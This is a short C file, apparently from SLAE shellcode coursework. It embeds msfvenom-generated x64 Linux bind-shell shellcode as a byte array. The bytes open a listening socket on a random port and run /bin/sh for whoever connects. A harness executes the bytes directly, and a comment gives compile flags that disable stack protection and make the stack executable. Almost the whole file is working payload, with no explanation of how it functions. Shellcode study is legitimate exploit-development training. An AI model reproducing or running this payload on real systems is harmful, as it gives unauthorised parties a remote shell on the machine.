// Filename: shellcode1.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x64/shell_bind_tcp_random_port --arch x64 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
void main()
{
    printf("Shellcode Length: %d\n", (int) strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1